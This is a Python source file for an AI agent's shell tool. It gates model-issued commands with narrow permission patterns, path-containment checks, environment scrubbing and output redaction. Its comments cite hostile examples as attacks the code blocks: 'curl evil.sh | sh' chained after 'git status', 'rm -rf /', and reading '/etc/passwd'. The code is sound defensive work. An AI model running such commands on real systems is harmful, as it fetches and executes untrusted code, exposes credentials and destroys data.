"""
bash — a real shell tool.

The old implementation blocked every shell metacharacter and allow-listed 16
binaries, which made `make 2>&1 | tail` impossible. opencode runs commands
through a real shell and relies on the permission layer for safety; this does
the same, with a Haiku-aware default command in the description.

Five things here are load-bearing and easy to get wrong:

* `_permission_patterns` decides what an "always allow" grant covers. It is the
  only thing standing between "the user approved `git status`" and "the model
  ran `git status; curl evil.sh | sh`". See the notes on _is_simple below.
* `_scan` resolves the *file arguments* of a command. Without it an "always"
  grant on `cat README.md` widens to `cat *`, and `cat /etc/hosts` then runs
  with no prompt at all: the grant is about the command shape, so containment
  has to come from a separate external_directory question per path touched.
* the child runs in its own process group, so a timeout kills the whole tree
  rather than orphaning `sleep 300` behind a dead `bash -c`.
* output is streamed into bounded sinks while the run is polled for the user's
  abort. `communicate(timeout=...)` could do neither: it buffers the whole
  stream in RAM and only ever notices the deadline.
* the child runs with a scrubbed environment and its output is redacted. A
  tool result is replayed to the model provider and stored in the session
  database forever, so `printenv` inheriting the user's API keys writes them
  to disk and ships them to a third party in one careless turn.
"""

import collections
import os
import re
import signal
import subprocess
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from ..redact import redact, scrub_env
from ..schema import ToolAborted
from .base import Tool, ToolContext, ToolResult, load_prompt
from .paths import assert_external_directory, is_inside, parent_glob

DEFAULT_TIMEOUT = 60
MAX_TIMEOUT = 600
MAX_OUTPUT = 30000

# CSI (colour, cursor) and OSC (title) escape sequences. Terminal control
# has no meaning inside a tool result; see the call site for why TERM=dumb
# does not prevent them on Haiku.
_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]"
                      r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)")


def _strip_ansi(text: str) -> str:
    return _ANSI_RE.sub("", text) if "\x1b" in text else text
KILL_GRACE = 2.0
READ_CHUNK = 8192
POLL_INTERVAL = 0.05

# Marker put in front of anything that is more than one plain command. See
# _permission_target for why this exists — it is a security boundary, not
# decoration.
COMPOUND_PREFIX = "shell: "

# Commands that get a coarser permission pattern so "always allow" is useful
# without handing over the whole shell.
READONLY_PREFIXES = (
    "ls", "cat", "head", "tail", "wc", "file", "pwd", "which", "echo",
    "git status", "git diff", "git log", "git show", "git branch",
    "pkgman search", "pkgman list", "ps", "df", "uname", "date",
)

# Characters that can only appear in a command doing more than running one
# program: separators, redirections, substitutions, globbing, quoting, escapes,
# history/brace expansion. A command containing any of them never gets a
# prefix pattern.
_UNSAFE = set(";&|<>()$`\\\"'\n\r\t*?[]{}!#~")

# What a token in a "simple" command may contain. Deliberately narrow: adding a
# character here widens every "always" grant the user has ever given.
_TOKEN = re.compile(r"^[A-Za-z0-9_./+:@,%=-]+$")

# Programs whose whole job is running *another* program. Approving one of these
# once must never widen to "anything this program can launch", so they only
# ever get an exact-command grant. `git` is here because `git status` and
# friends widen through READONLY_PREFIXES above, while `git submodule foreach
# <anything>` must not ride along on a `git *` grant.
_RUNNERS = {
    "env", "sudo", "doas", "su", "xargs", "nohup", "nice", "time", "timeout",
    "sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "screen", "tmux",
    "python", "python2", "python3", "perl", "ruby", "node", "deno", "bun",
    "awk", "gawk", "sed", "find", "ssh", "scp", "rsync", "docker", "podman",
    "make", "git", "eval", "exec", "command", "watch", "setsid", "chroot",
}

# Programs whose non-flag arguments name files. Their arguments are resolved
# and screened even when they look like bare words, because `cat passwd` with
# workdir=/etc is the same attack as `cat /etc/passwd`. Commands *not* listed
# here still get their obviously path-shaped arguments (`/x`, `./x`, `~/x`,
# `a/b`) and their redirection targets screened.
_PATH_COMMANDS = frozenset({
    "awk", "basename", "bzip2", "cat", "cd", "chdir", "chgrp", "chmod",
    "chown", "cksum", "cmp", "cp", "cut", "dd", "diff", "dirname", "du",
    "egrep", "fgrep", "file", "find", "grep", "gunzip", "gzip", "head",
    "install", "ln", "ls", "md5sum", "mkdir", "more", "mv", "nl", "od",
    "patch", "popd", "pushd", "readlink", "realpath", "rm", "rmdir", "rsync",
    "scp", "sed", "sha1sum", "sha256sum", "shasum", "sort", "split", "stat",
    "strings", "tail", "tar", "tee", "touch", "tr", "truncate", "unzip",
    "uniq", "wc", "xxd", "xz", "zip",
})

# `chmod +x file` and friends: a leading `+mode` is not a path.
_MODE_COMMANDS = frozenset({"chgrp", "chmod", "chown"})

# `cmd 2>/dev/null` is not "leaving the working directory"; prompting for it
# would train the user to approve /dev/* , which is the opposite of contained.
_HARMLESS_PATHS = frozenset({"/dev/null"})

# `FOO=1 rm -rf /` — the program is `rm`, not the assignment.
_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# `2>&1`: the redirection target is a file descriptor, not a file.
_FD = re.compile(r"^(\d+|-)$")
# The first of these ends the part of a word we can resolve without globbing.
_GLOB_CHARS = "*?[{"


class _Command:
    """
    One simple command out of a command line.

    `words` is argv, `redirects` the targets of any `>`/`<`. A `None` entry is
    a word whose value only the shell knows (`$X`, `$(id)`, an unterminated
    quote) — it is never treated as a path, and its presence makes the whole
    parse uncertain.
    """

    __slots__ = ("words", "redirects")

    def __init__(self) -> None:
        self.words: List[Optional[str]] = []
        self.redirects: List[Optional[str]] = []


def _skip_expansion(text: str, index: int) -> int:
    """Index just past a `$(...)`, `${...}`, `$name` or backtick expansion."""
    end = len(text)
    if text[index] == "`":
        close = text.find("`", index + 1)
        return end if close == -1 else close + 1
    if text[index:index + 2] == "$(":
        depth = 0
        cursor = index + 1
        while cursor < end:
            if text[cursor] == "(":
                depth += 1
            elif text[cursor] == ")":
                depth -= 1
                if depth == 0:
                    return cursor + 1
            cursor += 1
        return end
    if text[index:index + 2] == "${":
        close = text.find("}", index + 2)
        return end if close == -1 else close + 1
    cursor = index + 1
    while cursor < end and (text[cursor].isalnum() or text[cursor] == "_"):
        cursor += 1
    return cursor if cursor > index + 1 else index + 1


def _scan(text: str) -> Tuple[List[_Command], bool]:
    """
    Split a command line into simple commands and their literal words.

    This is deliberately not a shell grammar. It is a conservative reader whose
    only job is to answer "which files does this touch?" — and to admit when it
    cannot tell. The second return value is False as soon as anything appears
    whose value depends on running the shell (substitution, variables, a
    heredoc, an unbalanced quote); callers must not widen an "always" grant
    when it is False.
    """
    commands: List[_Command] = []
    current = _Command()
    word: List[str] = []
    started = False       # a word is open (possibly empty, as in `''`)
    unknown = False       # the open word contains something dynamic
    redirect = False      # the open word is a redirection target
    certain = True

    def flush() -> None:
        nonlocal started, unknown, redirect
        if started:
            value = None if unknown else "".join(word)
            (current.redirects if redirect else current.words).append(value)
        del word[:]
        started = False
        unknown = False
        redirect = False

    def finish() -> None:
        nonlocal current
        flush()
        if current.words or current.redirects:
            commands.append(current)
        current = _Command()

    index, end = 0, len(text)
    while index < end:
        char = text[index]

        if char in " \t":
            flush()
            index += 1
            continue

        if char == "#" and not started:
            while index < end and text[index] not in "\n\r":
                index += 1
            continue

        if char == "\\":
            if index + 1 >= end:
                certain = False
                break
            word.append(text[index + 1])
            started = True
            index += 2
            continue

        if char == "'":
            close = text.find("'", index + 1)
            if close == -1:
                certain = False
                unknown = True
                started = True
                break
            word.append(text[index + 1:close])
            started = True
            index = close + 1
            continue

        if char == '"':
            cursor = index + 1
            body: List[str] = []
            closed = False
            while cursor < end:
                if text[cursor] == "\\" and cursor + 1 < end:
                    body.append(text[cursor + 1])
                    cursor += 2
                    continue
                if text[cursor] == '"':
                    closed = True
                    break
                body.append(text[cursor])
                cursor += 1
            started = True
            if not closed:
                certain = False
                unknown = True
                break
            chunk = "".join(body)
            if "$" in chunk or "`" in chunk:
                certain = False
                unknown = True
            else:
                word.append(chunk)
            index = cursor + 1
            continue

        if char in "$`":
            certain = False
            unknown = True
            started = True
            index = _skip_expansion(text, index)
            continue

        if char in "<>" or text[index:index + 2] == "&>":
            flush()
            if text[index:index + 2] == "<<":
                # Heredoc / here-string: the delimiter is data, not a path.
                certain = False
                index += 2
                if index < end and text[index] == "<":
                    index += 1
                while index < end and text[index] in " \t":
                    index += 1
                while index < end and text[index] not in " \t\n\r;&|<>":
                    index += 1
                continue
            cursor = index
            if text[cursor] == "&":
                cursor += 1
            while cursor < end and text[cursor] in "<>":
                cursor += 1
            if cursor < end and text[cursor] == "|":
                cursor += 1
            if cursor < end and text[cursor] == "&":
                cursor += 1
            index = cursor
            while index < end and text[index] in " \t":
                index += 1
            redirect = True
            continue

        if char in ";\n\r()":
            finish()
            index += 1
            continue

        if char in "&|":
            finish()
            while index < end and text[index] in "&|":
                index += 1
            continue

        word.append(char)
        started = True
        index += 1

    finish()
    return commands, certain


def _literal_prefix(text: str) -> Optional[str]:
    """
    The part of a word that is a fixed path, or None when there is none.

    `/etc/*` names a file in /etc whatever the glob expands to, so the prefix
    is enough to decide which directory is being touched. A word that *starts*
    with a glob character says nothing about location and is dropped.
    """
    positions = [text.find(char) for char in _GLOB_CHARS]
    hits = [position for position in positions if position >= 0]
    if not hits:
        return text
    first = min(hits)
    return None if first == 0 else text[:first]


def _resolve_arg(text: str, workdir: str) -> Optional[Path]:
    """A word turned into the absolute path the shell would use, or None."""
    if not text:
        return None
    expanded = os.path.expanduser(text) if text.startswith("~") else text
    literal = _literal_prefix(expanded)
    if not literal:
        return None
    path = Path(literal)
    if not path.is_absolute():
        path = Path(workdir) / path
    try:
        return path.resolve()
    except OSError:
        return Path(os.path.normpath(str(path)))


def _candidates(command: _Command) -> List[str]:
    """Every word of one command that could name a file."""
    words = command.words
    start = 0
    while (start < len(words) and words[start] is not None
           and _ASSIGNMENT.match(words[start])):
        start += 1

    program = words[start] if start < len(words) else None
    name = os.path.basename(program) if program else ""
    out: List[str] = []

    for target in command.redirects:
        if target and not _FD.match(target):
            out.append(target)

    if program and ("/" in program or program.startswith("~")):
        out.append(program)

    known = name in _PATH_COMMANDS
    end_of_flags = False
    for value in words[start + 1:]:
        if value is None:
            continue
        if not end_of_flags:
            if value == "--":
                end_of_flags = True
                continue
            if len(value) > 1 and value.startswith("-"):
                continue
            if name in _MODE_COMMANDS and value.startswith("+"):
                continue
        if known or "/" in value or value.startswith("~"):
            out.append(value)
    return out


def _ask_external_paths(ctx: ToolContext, commands: List[_Command],
                        workdir: str) -> List[str]:
    """
    One external_directory question per directory the command reaches into.

    Returns the directories asked about (for metadata). The bash grant answers
    "may this command shape run"; this answers "may it run *there*", and the
    two have to be separate or an `always` on `cat README.md` reads the disk.
    """
    asked: List[str] = []
    seen = set()
    for command in commands:
        for argument in _candidates(command):
            path = _resolve_arg(argument, workdir)
            if path is None or is_inside(ctx, path):
                continue
            if str(path) in _HARMLESS_PATHS:
                continue
            kind = "directory" if path.is_dir() else "file"
            glob = parent_glob(path, kind=kind)
            if glob in seen:
                continue
            seen.add(glob)
            assert_external_directory(ctx, path, kind=kind,
                                      action="Command touches")
            asked.append(glob)
    return asked


def _is_simple(command: str) -> bool:
    """
    True only for `prog arg arg` with nothing clever in it.

    Everything else — `FOO=1 rm -rf /`, `echo hi; rm -rf /`, `echo $(id)`,
    `echo a && curl x | sh`, quoted or escaped arguments, redirections, globs —
    is *not* simple, and so cannot borrow another command's approval.
    """
    stripped = command.strip()
    if not stripped:
        return False
    if any(char in _UNSAFE for char in stripped):
        return False
    tokens = stripped.split()
    if not tokens:
        return False
    return all(_TOKEN.match(token) for token in tokens)


def _fnmatch_literal(text: str) -> str:
    """
    Escape a string so fnmatch matches it and nothing else.

    fnmatch has no escape character, but a one-element character class is a
    literal: `[*]` matches `*`, `[?]` matches `?`, `[[]` matches `[`. Without
    this, a command containing a `*` would produce a permission pattern that
    also matches commands the user never saw.
    """
    out = []
    for char in text:
        if char in "*?[":
            out.append("[" + char + "]")
        else:
            out.append(char)
    return "".join(out)


def _canonical(command: str) -> str:
    """
    Collapse insignificant whitespace so `  rm   -rf /` cannot dodge a rule
    written as `rm *`. Newlines are *not* collapsed: a newline separates
    commands, and folding it into a space would turn two commands into one
    innocent-looking line.
    """
    if "\n" in command or "\r" in command:
        return command.strip()
    return " ".join(command.split())


def _permission_target(command: str) -> str:
    """
    The string permission rules and session grants are matched against.

    A compound command is deliberately *not* presented as its own text.
    fnmatch's `*` spans everything, newlines and `;` included, so a grant of
    `echo *` would otherwise match `echo hi; rm -rf /` — precisely the
    "collapse a dangerous command onto an approved pattern" attack. Prefixing
    the compound form means such a command can only be matched by a rule that
    opts into compound commands (`shell: *`) or by a blanket `*`.
    """
    canonical = _canonical(command)
    if not canonical:
        return "*"
    return canonical if _is_simple(canonical) else COMPOUND_PREFIX + canonical


def _permission_patterns(command: str) -> List[str]:
    """
    The patterns an "always" grant is stored under, narrowest first.

    For a simple command we widen to the program (or a known read-only
    sub-command) so that approving `git status` also covers `git status -s`.
    For anything else the grant is the exact command text and nothing more:
    a chained, quoted, substituted or redirected command must be re-approved,
    because there is no honest way to summarise what it will do.
    """
    canonical = _canonical(command)
    if not canonical:
        return ["*"]

    if not _is_simple(canonical):
        return [_fnmatch_literal(COMPOUND_PREFIX + canonical)]

    # Fail closed when the two readers disagree. _is_simple already rejects
    # quoting, globbing and substitution, so this only fires if _scan sees
    # something it cannot pin down — and then the narrow answer is the right
    # one: a widened pattern we cannot describe is a blank cheque.
    commands, certain = _scan(canonical)
    if (not certain or len(commands) != 1
            or any(word is None for word in commands[0].words)):
        return [_fnmatch_literal(canonical)]

    for prefix in READONLY_PREFIXES:
        if canonical == prefix or canonical.startswith(prefix + " "):
            return [prefix, prefix + " *"]

    first = canonical.split()[0]
    if "=" in first:
        # A leading assignment (`FOO=1 rm -rf /`) is not the program name.
        return [_fnmatch_literal(canonical)]
    if os.path.basename(first) in _RUNNERS:
        return [_fnmatch_literal(canonical)]
    return [first, first + " *"]


def _permission_pattern(command: str) -> str:
    """The pattern shown to the user (the widest of the grant patterns)."""
    return _permission_patterns(command)[-1]


def _kill_group(proc: subprocess.Popen) -> None:
    """
    SIGTERM then SIGKILL the child's whole process group.

    Killing only `proc` leaves `sleep 300 &` (or a compiler's job server, or a
    test runner's workers) running with no parent — the classic orphan. The
    child is started with start_new_session=True precisely so there is a group
    to signal here.
    """
    try:
        pgid = os.getpgid(proc.pid)
    except (OSError, AttributeError):
        pgid = None

    for sig in (signal.SIGTERM, signal.SIGKILL):
        if proc.poll() is not None:
            return
        try:
            if pgid is not None and hasattr(os, "killpg"):
                os.killpg(pgid, sig)
            else:
                proc.send_signal(sig)
        except (OSError, ProcessLookupError, ValueError):
            return
        try:
            proc.wait(timeout=KILL_GRACE)
            return
        except subprocess.TimeoutExpired:
            continue


class _BoundedSink:
    """
    The head and the tail of a stream, with the middle counted, not kept.

    The old code handed both pipes to `communicate()` and truncated afterwards,
    so `cat huge.bin` cost as much RAM as the file — a command the model can
    issue at will. Readers push fixed-size chunks in here instead and the
    resident size stays flat no matter how much the child prints.
    """

    def __init__(self, limit: int = MAX_OUTPUT):
        self.limit = max(2, limit)
        self.head_limit = self.limit // 2
        self.tail_limit = self.limit - self.head_limit
        self.dropped = 0
        self.total = 0
        self._head: List[str] = []
        self._head_len = 0
        self._tail = collections.deque()   # type: collections.deque
        self._tail_len = 0
        self._lock = threading.Lock()

    def add(self, text: str) -> None:
        if not text:
            return
        with self._lock:
            self.total += len(text)
            if self._head_len < self.head_limit:
                room = self.head_limit - self._head_len
                self._head.append(text[:room])
                self._head_len += min(room, len(text))
                text = text[room:]
                if not text:
                    return
            self._tail.append(text)
            self._tail_len += len(text)
            while (self._tail
                   and self._tail_len - len(self._tail[0]) >= self.tail_limit):
                gone = self._tail.popleft()
                self._tail_len -= len(gone)
                self.dropped += len(gone)
            excess = self._tail_len - self.tail_limit
            if excess > 0 and self._tail:
                first = self._tail.popleft()
                self._tail.appendleft(first[excess:])
                self._tail_len -= excess
                self.dropped += excess

    def text(self) -> str:
        with self._lock:
            head = "".join(self._head)
            tail = "".join(self._tail)
            dropped = self.dropped
        if dropped:
            return (head + "\n\n[... %d characters truncated ...]\n\n" % dropped
                    + tail)
        return head + tail


def _drain(stream, sink: _BoundedSink) -> None:
    """
    Copy a pipe into a bounded sink, holding one chunk at a time.

    readline with a size limit rather than read(n): read(n) blocks until it has
    n characters, so a command that prints one line and then keeps a pipe open
    would look like it printed nothing. readline returns at the newline, and
    the limit still bounds a single enormous line.
    """
    try:
        while True:
            chunk = stream.readline(READ_CHUNK)
            if not chunk:
                return
            sink.add(chunk)
    except (OSError, ValueError):
        return


def _abort_signal(ctx: ToolContext):
    """
    The run's cancellation Event, when the context carries one.

    getattr rather than an attribute access: with the Event we can block on
    `wait()` and wake the instant the user aborts, and without it (a duck-typed
    context, an older caller) we fall back to polling `ctx.aborted`.
    """
    return getattr(ctx, "abort_event", None)


def _aborted(ctx: ToolContext, signal_event) -> bool:
    if signal_event is not None and signal_event.is_set():
        return True
    return bool(getattr(ctx, "aborted", False))


def _supervise(proc: subprocess.Popen, timeout: float, ctx: ToolContext,
               readers: List[threading.Thread]) -> Tuple[bool, bool]:
    """
    Wait for the child and its output, returning (timed_out, aborted).

    `communicate(timeout=...)` blocks in a thread join: it sees the deadline
    and nothing else, so an aborted run kept burning CPU until the timeout.
    Polling is the only way to notice both. The readers are part of the wait
    for the same reason communicate() waits on the pipes — a background job
    that inherited stdout is still producing the command's output.
    """
    signal_event = _abort_signal(ctx)
    deadline = time.monotonic() + timeout
    while True:
        if proc.poll() is not None and not any(r.is_alive() for r in readers):
            return False, False
        if _aborted(ctx, signal_event):
            return False, True
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return True, False
        pause = min(POLL_INTERVAL, remaining)
        if signal_event is not None:
            signal_event.wait(pause)
        else:
            time.sleep(pause)


class BashTool(Tool):
    name = "bash"
    description = load_prompt("bash.txt")
    permission = "bash"
    parameters = {
        "type": "object",
        "properties": {
            "command": {"type": "string", "description": "The command to execute"},
            "timeout": {"type": "integer",
                        "description": "Optional timeout in seconds (default 60, max 600)"},
            "workdir": {"type": "string",
                        "description": "The working directory to run the command in. "
                                       "Use this instead of 'cd' commands."},
            "description": {"type": "string",
                            "description": "Short description of what this command does, in active voice"},
        },
        "required": ["command"],
    }

    def execute(self, args: Dict[str, Any], ctx: ToolContext) -> ToolResult:
        command = args["command"]
        timeout = min(int(args.get("timeout") or DEFAULT_TIMEOUT), MAX_TIMEOUT)
        workdir = str(ctx.resolve(args["workdir"])) if args.get("workdir") else ctx.cwd
        label = args.get("description") or command

        # Containment first, and independently of the command grant: an
        # "always" on `cat README.md` is a grant for the *shape* `cat *`, so
        # every path the command reaches — including the working directory it
        # is handed — has to be approved on its own.
        commands, _certain = _scan(command)
        assert_external_directory(ctx, workdir, kind="directory",
                                  action="Run commands in")
        external = _ask_external_paths(ctx, commands, workdir)

        # The request carries the one thing being done — the command itself.
        # Permissions.ask() requires *every* pattern in a request to be
        # allowed, so the widened shapes belong in `always` and nowhere else:
        # listing `rm *` alongside `rm -rf build` would make a `*: deny` rule
        # refuse a command the user never asked about. The user still sees the
        # verbatim command in the title and in metadata["command"].
        patterns = _permission_patterns(command)
        target = _permission_target(command)
        ctx.ask("bash", [target], f"Run: {command}",
                {"command": command, "workdir": workdir,
                 "external": external}, always=patterns)

        # Not dict(os.environ): the child must not be able to read back the
        # user's API keys, because everything it prints is appended to the
        # agent history, sent to the provider and persisted in the session.
        env = scrub_env(os.environ)
        env.setdefault("PAGER", "cat")
        env.setdefault("GIT_PAGER", "cat")
        env["TERM"] = "dumb"  # stop tools from emitting escape sequences

        try:
            proc = subprocess.Popen(
                command, shell=True, cwd=workdir, env=env,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL, text=True, errors="replace",
                # New session => new process group => a timeout can kill the
                # whole tree, and the child cannot steal our controlling tty.
                start_new_session=True)
        except OSError as e:
            return ToolResult(title=label, output=f"Failed to run command: {e}",
                              metadata={"exit": -1})

        out_sink = _BoundedSink(MAX_OUTPUT)
        err_sink = _BoundedSink(MAX_OUTPUT)
        readers = []
        for stream, sink in ((proc.stdout, out_sink), (proc.stderr, err_sink)):
            reader = threading.Thread(target=_drain, args=(stream, sink),
                                      daemon=True)
            reader.start()
            readers.append(reader)

        try:
            timed_out, aborted = _supervise(proc, timeout, ctx, readers)
        except BaseException:
            # Interrupt: never leave the tree running behind us.
            _kill_group(proc)
            raise

        if timed_out or aborted:
            _kill_group(proc)
        try:
            proc.wait(timeout=KILL_GRACE)
        except (subprocess.TimeoutExpired, ValueError, OSError):
            pass
        # One shared deadline, not one per reader: when the child has exited
        # but something it spawned inherited the pipes (`daemon &`), draining
        # can never finish, and waiting per reader would double the stall.
        drain_deadline = time.monotonic() + KILL_GRACE
        for reader in readers:
            reader.join(max(0.0, drain_deadline - time.monotonic()))
        if not any(reader.is_alive() for reader in readers):
            # Only safe once the readers are done: a blocked read() owns the
            # stream's lock, and close() would wait for it forever.
            for stream in (proc.stdout, proc.stderr):
                try:
                    if stream is not None and not stream.closed:
                        stream.close()
                except (OSError, ValueError):
                    pass

        # Scrubbing the environment stops the child reading *our* keys; the
        # second pass is for the ones it read from somewhere else — a .env
        # file, a curl response, a config dump. Both directions leak equally.
        stdout, stderr = redact(out_sink.text()), redact(err_sink.text())
        # TERM=dumb is not enough on Haiku: its own userland (df, listdev)
        # colourises unconditionally, so tool results carried raw SGR/CSI
        # bytes into the model's context — observed live on the 32-bit
        # machine. Escapes cost tokens and teach the model nothing.
        stdout, stderr = _strip_ansi(stdout), _strip_ansi(stderr)
        parts = []
        if stdout:
            parts.append(stdout.rstrip())
        if stderr:
            parts.append(("<stderr>\n" if stdout else "") + stderr.rstrip())
        output = "\n".join(p for p in parts if p)
        truncated = bool(out_sink.dropped or err_sink.dropped)

        if len(output) > MAX_OUTPUT:
            truncated = True
            head = output[: MAX_OUTPUT // 2]
            tail = output[-MAX_OUTPUT // 2:]
            output = (f"{head}\n\n[... {len(output) - MAX_OUTPUT} characters truncated ...]\n\n{tail}")

        if aborted:
            raise ToolAborted(f"Command aborted by user: {command}")

        if timed_out:
            message = f"Command timed out after {timeout}s: {command}"
            output = (output + "\n" + message) if output else message
            return ToolResult(title=label, output=output,
                              metadata={"exit": -1, "timeout": True,
                                        "truncated": truncated,
                                        "command": command, "workdir": workdir})

        code = proc.returncode
        if code != 0:
            output = (output + "\n" if output else "") + f"[exit code {code}]"
        if not output:
            output = "(no output)"

        return ToolResult(title=label, output=output,
                          metadata={"exit": code, "truncated": truncated,
                                    "command": command, "workdir": workdir})
